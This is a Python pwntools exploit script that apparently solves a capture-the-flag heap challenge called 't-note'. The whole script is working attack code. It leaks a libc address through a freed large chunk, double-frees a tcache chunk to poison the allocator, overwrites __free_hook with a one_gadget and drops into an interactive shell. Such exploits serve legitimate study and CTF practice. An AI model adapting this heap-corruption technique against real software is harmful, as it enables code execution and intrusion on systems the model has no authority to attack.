#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'


r = process('./t-note')
#r = remote('edu-ctf.csie.org',10178)
libc = ELF('./libc.so')

def cmd(x):
    r.recvuntil('>')
    r.send(x)

def add(s,l):
    cmd('1')
    r.recvuntil('Size: ')
    r.send(str(int(l)))
    r.recvuntil('Note: ')
    r.send(s)

def show(i):
    cmd('2')
    r.recvuntil('Index: ')
    r.send(str(i))

def delete(i):
    cmd('3')
    r.recvuntil('Index: ')
    r.send(str(i))


add('a'*16,0x410) # >smallbin size , 0x100 will put into tcache
add('b'*16,0x20) #
delete(0)
show(0)

r.recvuntil(':\n')
leak = u64(r.recvuntil('\n')[:-1].ljust(8,'\x00'))
libc_base = leak - 0x3ebca0
print hex(libc_base)

malloc_hook = libc_base + libc.symbols['__free_hook']
one_gadget = libc_base + 0x4f322

delete(1)
delete(1)


add(p64(malloc_hook),0x20)
add('a',0x20)
add(p64(one_gadget),0x20)


r.interactive()
